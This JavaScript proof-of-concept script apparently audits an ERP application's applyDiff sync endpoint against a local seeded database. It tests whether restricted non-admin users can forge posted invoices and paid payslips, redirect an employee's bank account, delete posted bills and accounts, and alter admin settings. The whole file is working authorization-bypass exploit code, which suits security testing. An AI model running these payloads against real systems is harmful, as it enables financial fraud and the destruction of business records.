// PoC: non-admin, app-restricted callers of applyDiff (same args as POST /api/diff at server/index.js:434)
const W = process.argv[2];
const { seed } = await import(W + '/src/seed.js');
const { applyDiff } = await import(W + '/src/sync.js');
const { modelsForApps } = await import(W + '/src/models/index.js');
const { search, read } = await import(W + '/src/orm.js');
let db = seed();
const empty = () => ({ upserts: {}, deletes: {}, messages: [], removedMessages: [], seq: {}, settings: null });
const ctx = (apps) => ({ author: 'mallory', isAdmin: false, allowed: modelsForApps(apps) });
const tryit = (label, d, c) => { try { const next = applyDiff(db, { ...empty(), ...d }, c); console.log('ACCEPTED', label); return next; } catch (e) { console.log('REJECTED', label, '->', e.message); return null; } };
const inv = ctx(['inventory']);
console.log('inventory user can write account.move?', inv.allowed.has('account.move'), '| allowed size', inv.allowed.size);
// 1. forge a brand-new POSTED, unbalanced customer invoice (no "Confirm" button run)
let n = tryit('1 create posted unbalanced invoice', { upserts: { 'account.move': [{ id: 500, name: 'INV/2026/99999', move_type: 'out_invoice', state: 'posted', partner_id: 4, invoice_date: '2026-10-20', journal_id: 1,
  invoice_line_ids: [{ product_id: 2, qty: 1, price_unit: 1000000, tax: 0 }], line_ids: [{ account_id: 3, partner_id: 4, name: 'x', debit: 1000000, credit: 0 }], amount_paid: 0 }] }, seq: { 'account.move': 500 } }, inv);
if (n) { const m = read(n, 'account.move', 500); console.log('   stored:', m.name, m.state, 'total', m.amount_total, 'residual', m.amount_residual, 'debit', m.line_ids[0].debit, 'credit sum', m.line_ids.reduce((s,l)=>s+l.credit,0)); }
// 2. rewrite an existing posted invoice's lines and amounts
const p2 = db.records['account.move'].find((m) => m.id === 2);
n = tryit('2 rewrite posted INV/2026/00001 lines', { upserts: { 'account.move': [{ ...p2, invoice_line_ids: [{ product_id: 2, qty: 1, price_unit: 1, tax: 0 }], line_ids: [{ account_id: 3, partner_id: 4, name: 'x', debit: 1, credit: 0 }] }] } }, inv);
if (n) console.log('   INV/2026/00001 total before', read(db,'account.move',2).amount_total, 'after', read(n,'account.move',2).amount_total);
// 3. mark an invoice paid with no payment by setting the readonly amount_paid
const p4 = db.records['account.move'].find((m) => m.id === 4);
n = tryit('3 set amount_paid on INV/2026/00002', { upserts: { 'account.move': [{ ...p4, amount_paid: 999999 }] } }, inv);
if (n) console.log('   residual before', read(db,'account.move',4).amount_residual, 'after', read(n,'account.move',4).amount_residual, 'payment_state', read(n,'account.move',4).payment_state);
// 4. delete posted vendor bill BILL/2026/00001
n = tryit('4 delete posted BILL/2026/00001', { deletes: { 'account.move': [9] } }, inv);
if (n) console.log('   bill still present?', !!read(n, 'account.move', 9));
// 5. stock.picking forced to done without validation (inventory app)
const pk = db.records['stock.picking'][0];
n = tryit('5 force picking done with qty 10000', { upserts: { 'stock.picking': [{ ...pk, state: 'done', date_done: '2026-10-20', move_ids: (pk.move_ids||[]).map(m=>({...m, qty: 10000})) }] } }, inv);
// 6. payroll user forges a paid payslip with arbitrary net
const pay = ctx(['payroll']);
n = tryit('6 create payslip state=paid', { upserts: { 'hr.payslip': [{ id: 900, employee_id: 2, state: 'paid', date_from: '2026-10-01', date_to: '2026-10-31', line_ids: [{ code: 'NET', name: 'Net', amount: 250000 }] }] } }, pay);
if (n) console.log('   payslip', JSON.stringify(read(n, 'hr.payslip', 900)).slice(0, 200));
// 7. a "contacts"-only user edits HR salary/bank data and the chart of accounts
const con = ctx(['contacts']);
console.log('contacts user allowed hr.employee/account.account:', con.allowed.has('hr.employee'), con.allowed.has('account.account'));
const e1 = db.records['hr.employee'][0];
n = tryit('7a contacts user sets employee wage/bank', { upserts: { 'hr.employee': [{ ...e1, wage: 1, bank_account: 'ATTACKER-IBAN' }] } }, con);
const a1 = db.records['account.account'][0];
tryit('7b contacts user renames/recodes account', { upserts: { 'account.account': [{ ...a1, code: '999999', name: 'pwned' }] } }, con);
tryit('7c contacts user deletes all accounts', { deletes: { 'account.account': db.records['account.account'].map(a=>a.id) } }, con);
// 8. contacts user writes outside allowed models: should be rejected
tryit('8 contacts user upserts sale.order (outside apps)', { upserts: { 'sale.order': [{ ...db.records['sale.order'][0], amount_total: 1 }] } }, con);
// 9. contacts user removes chatter of models outside its apps
const target = db.messages.filter((m) => !con.allowed.has(m.model));
n = tryit(`9 contacts user removes ${target.length} messages of non-allowed models`, { removedMessages: target.map((m) => m.id) }, con);
if (n) console.log('   messages before', db.messages.length, 'after', n.messages.length, 'sample removed models', [...new Set(target.map(m=>m.model))].slice(0,5).join(','));
// 10. seq of a model outside allowed set
n = tryit('10 contacts user bumps seq of sale.order', { seq: { 'sale.order': Number.MAX_SAFE_INTEGER } }, con);
if (n) console.log('   sale.order seq', n.seq['sale.order'], 'next id', n.seq['sale.order'] + 1, 'next-next id equal?', (n.seq['sale.order'] + 1) === (n.seq['sale.order'] + 2));
// 11. admin-only settings ignored for non-admin?
n = tryit('11 non-admin lock_date/currency/uninstalled', { settings: { ...db.settings, lock_date: '2030-01-01', currency: 'EUR', uninstalled: ['accounting'], company: 'X' } }, con);
if (n) console.log('   lock_date', n.settings.lock_date, 'currency', n.settings.currency, 'company', n.settings.company, 'uninstalled', n.settings.uninstalled);
